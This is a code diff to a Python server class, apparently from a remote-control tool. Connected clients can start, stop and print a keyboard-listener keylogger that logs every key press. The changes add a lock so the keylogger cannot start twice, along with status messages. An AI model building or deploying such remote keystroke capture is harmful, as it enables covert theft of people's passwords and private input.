@@ -55,6 +55,7 @@ class Server:
 
   # Handle client connection
   def handle_client(self, conn, addr, end_conn):
+    lock = 0
     print(f"[NEW CONNECTION] {addr} connected.")
     connected = True
     try:
@@ -100,15 +101,25 @@ class Server:
 
         # Start keylogger
         elif data == CMD_START_KEYLOGGER.encode():
-          print(f'[KEYLOGGER] {addr} requested start keylogger.')
-          self.start_keylogger()
-          print(f'[KEYLOGGER] {addr} started keylogger.')
+          if lock == 0:
+            print(f'[KEYLOGGER] {addr} requested start keylogger.')
+            self.start_keylogger()
+            lock += 1
+            print(f'[KEYLOGGER] {addr} started keylogger.')
+          else:
+            print(f'[KEYLOGGER] {addr} requested start keylogger, but keylogger is already running.')
+            # conn.send('Keylogger is already running.'.encode())
 
         # Stop keylogger
         elif data == CMD_STOP_KEYLOGGER.encode():
-          print(f'[KEYLOGGER] {addr} requested stop keylogger.')
-          self.stop_keylogger()
-          print(f'[KEYLOGGER] {addr} stopped keylogger.')
+          if lock == 1:
+            print(f'[KEYLOGGER] {addr} requested stop keylogger.')
+            self.stop_keylogger()
+            lock -= 1
+            print(f'[KEYLOGGER] {addr} stopped keylogger.')
+          else:
+            print(f'[KEYLOGGER] {addr} requested stop keylogger, but keylogger is not running.')
+            # conn.send('Keylogger is not running.'.encode())
 
         # Print keylogger
         elif data == CMD_PRINT_KEYLOGGER.encode():
@@ -192,10 +203,12 @@ class Server:
     logging.info(str(key))
 
   def start_keylogger(self):
+    print("Running keylogger...")
     self.keylogger_listener = keyboard.Listener(on_press=self.on_press)
     self.keylogger_listener.start()
    
   def stop_keylogger(self):
+    print("Stopping keylogger...")
     self.keylogger_listener.stop()
 
   def get_all_apps(self):
